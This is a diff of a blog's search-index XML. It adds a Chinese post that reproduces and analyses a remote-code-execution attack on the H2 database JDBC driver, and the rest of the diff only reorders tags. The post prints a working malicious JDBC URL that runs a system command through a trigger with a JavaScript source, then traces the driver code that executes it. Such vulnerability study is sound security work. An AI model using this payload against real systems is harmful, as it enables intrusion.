@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>h2 jdbc 攻击</title>
+    <link href="/2021/12/27/h2-jdbc-%E6%94%BB%E5%87%BB/"/>
+    <url>/2021/12/27/h2-jdbc-%E6%94%BB%E5%87%BB/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> No！</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>IDEA新开个项目，直接从maven仓库里面复制配置过来安装h2依赖：</p><pre><code class="xml">&lt;!-- https://mvnrepository.com/artifact/com.h2database/h2 --&gt;&lt;dependency&gt;    &lt;groupId&gt;com.h2database&lt;/groupId&gt;    &lt;artifactId&gt;h2&lt;/artifactId&gt;    &lt;version&gt;2.0.204&lt;/version&gt;    &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt;</code></pre><p>然后写个简单的代码先测试一下：</p><pre><code class="java">String DRIVER_CLASS = &quot;org.h2.Driver&quot;;String JDBC_URL = &quot;&quot;;Properties info = null;try {    Class.forName(DRIVER_CLASS);    Connection conn = DriverManager.getDriver(DRIVER_CLASS).connect(JDBC_URL, info);}catch (ClassNotFoundException | SQLException e) {    e.printStackTrace();}</code></pre><p>发现：</p><pre><code>java.lang.ClassNotFoundException: org.h2.Driver</code></pre><p>回头看发现maven中配置的h2作用域为test，把这一行删掉再来：</p><pre><code>java.sql.SQLException: No suitable driver</code></pre><p>跟一下调用栈，问题出在h2驱动类org.h2.Driver的acceptsURL函数：</p><pre><code class="java">else if (var1.startsWith(&quot;jdbc:h2:&quot;)) {    return true;} else if (var1.equals(&quot;jdbc:default:connection&quot;)) {    return DEFAULT_CONNECTION.get() != null;}</code></pre><p>简单来说就是DRIVER_CLASS不符合格式，再改改代码里面的DRIVER_CLASS，反正只是用来选择驱动不涉及后面的操作，直接用参考文章中的攻击代码试试：</p><pre><code class="java">String DRIVER_CLASS = &quot;org.h2.Driver&quot;;String JDBC_URL = &quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot; +    &quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot; +    &quot;java.lang.Runtime.getRuntime().exec(&#39;cmd /c calc.exe&#39;)\n&quot; +    &quot;$$\n&quot;;;Properties info = null;try {    Class.forName(DRIVER_CLASS);    DriverManager.getDriver(JDBC_URL).connect(JDBC_URL, info);}catch (ClassNotFoundException | SQLException e) {    e.printStackTrace();}</code></pre><p>结果：</p><p><img src="/css/images/h2/2021122701.png" srcset="/img/loading.gif" alt=""></p><h3 id="攻击流程分析"><a href="#攻击流程分析" class="headerlink" title="攻击流程分析"></a>攻击流程分析</h3><p>很明显问题出在connect函数中，估计是因为执行查询时可以使用一些能直接执行代码的特殊语法：</p><pre><code class="java">public Connection connect(String var1, Properties var2) throws SQLException {    if (var1 == null) {        ...    } else if (var1.startsWith(&quot;jdbc:h2:&quot;)) {        return new JdbcConnection(var1, var2, (String)null, (Object)null);    } else {        return var1.equals(&quot;jdbc:default:connection&quot;) ? (Connection)DEFAULT_CONNECTION.get() : null;    }}</code></pre><p>实例化了一个JdbcConnection对象，后面会解析SQL命令，遇到create命令时：</p><pre><code class="java">case &#39;C&#39;:if (readIf(&quot;COMMIT&quot;)) {    c = parseCommit();} else if (readIf(&quot;CREATE&quot;)) {    c = parseCreate();</code></pre><p>会调用parseCreate函数：</p><pre><code class="java">else if (readIf(&quot;TRIGGER&quot;)) {    return parseCreateTrigger(force);}</code></pre><p>又遇到关键词TRIGGER时会调用parseCreateTrigger函数，在解析完TRIGGER相关的triggerName、触发时间点、操作类型、SchemaName、tableName等数据后，当存在as关键词时会开始解析TriggerSource：</p><pre><code class="java">if (readIf(AS)) {    command.setTriggerSource(readString());}</code></pre><p>回头看看攻击所用的TRIGGER的语句，简单来说就是在对INFORMATION_SCHEMA.TABLES这张表进行select操作之前就会触发这个TriggerSource操作，即：</p><pre><code>//javascript java.lang.Runtime.getRuntime().exec(&#39;cmd /c calc.exe&#39;)</code></pre><p>然后更新该Trigger，跟踪执行流程，会发现此时h2驱动会执行TriggerSource，然后从中取出一个Trigger对象作为triggerCallback，在后面触发操作时使用。一步步跟到TriggerObject类的loadFromSource函数中：</p><pre><code class="java">try {    if (SourceCompiler.isJavaxScriptSource(triggerSource)) {        return (Trigger) compiler.getCompiledScript(fullClassName).eval();    } else {        final Method m = compiler.getMethod(fullClassName);        if (m.getParameterTypes().length &gt; 0) {            throw new IllegalStateException(&quot;No parameters are allowed for a trigger&quot;);        }        return (Trigger) m.invoke(null);    }}</code></pre><p>首先调用isJavaxScriptSource函数判断代码类型：</p><pre><code class="java">public static boolean isJavaxScriptSource(String source) {    return isJavascriptSource(source) || isRubySource(source);}private static boolean isJavascriptSource(String source) {    return source.startsWith(&quot;//javascript&quot;);}</code></pre><p>即将//javascript开头的当作JavaScript代码，然后获取对应的编译器编译执行。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总结起来就是，在JDBC驱动和连接所用URL可控的情况下发起连接会导致RCE。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在maven仓库搜索h2包时，看到了有趣的东西：</p><p><img src="/css/images/h2/2021122702.png" srcset="/img/loading.gif" alt=""></p><p>1.4.200及之前版本的h2中存在一个XXE漏洞，其描述如下：</p><pre><code>The package com.h2database:h2 from 0 and before 2.0.202 are vulnerable to XML External Entity (XXE) Injection via the org.h2.jdbc.JdbcSQLXML class object, when it receives parsed string data from org.h2.jdbc.JdbcResultSet.getSQLXML() method. If it executes the getSource() method when the parameter is DOMSource.class it will trigger the vulnerability.</code></pre><p>懒得复现了，就这样留个坑吧。</p><hr><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/10656" target="_blank" rel="noopener">https://xz.aliyun.com/t/10656</a></p><p><a href="https://www.cnblogs.com/liuqiyun/p/8603088.html" target="_blank" rel="noopener">https://www.cnblogs.com/liuqiyun/p/8603088.html</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>机器学习入门4</title>
     <link href="/2021/12/10/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A84/"/>
     <url>/2021/12/10/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A84/</url>
@@ -1370,9 +1389,9 @@
       
       <tag>Web</tag>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -1505,9 +1524,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1583,9 +1602,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -1606,9 +1625,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1627,9 +1646,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1648,9 +1667,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1711,9 +1730,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>Web</tag>
+      
+      <tag>Crypto</tag>
       
       <tag>Pwn</tag>
       
@@ -1734,9 +1753,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1755,9 +1774,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1776,9 +1795,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1797,9 +1816,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -1879,9 +1898,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1940,9 +1959,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>复现</tag>
       
@@ -1963,9 +1982,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1984,9 +2003,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -2024,9 +2043,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -2045,9 +2064,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -2085,9 +2104,9 @@
     
     <tags>
       
-      <tag>Crypto</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Crypto</tag>
       
     </tags>
     
@@ -2106,9 +2125,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -2247,9 +2266,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -2289,9 +2308,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -2310,9 +2329,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
